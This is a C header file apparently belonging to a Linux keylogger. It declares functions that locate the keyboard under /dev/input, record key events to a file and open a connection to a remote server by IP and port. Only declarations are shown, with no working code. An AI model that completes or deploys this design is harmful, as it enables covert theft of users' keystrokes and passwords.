#ifndef KEYLOGGER
#define KEYLOGGER

#define MAX_EVENTS 10
#define KEY_PRESSED 1
#define KEY_RELEASED 0
#define KEY_REPEATED 2
#define PATH "/dev/input/"
typedef struct input_event event;

void startKeylogger(int keyboard, int server);
int findKeyboardDevice(char *dir_path);
int isKeyboardDevice(char *path, int *keyboard_device);
int writeEventsIntoFile(int fd, event *events, size_t to_write);
void sigHandler(int signum);
int openConnectionWithServer(char*ip, short port);

#endif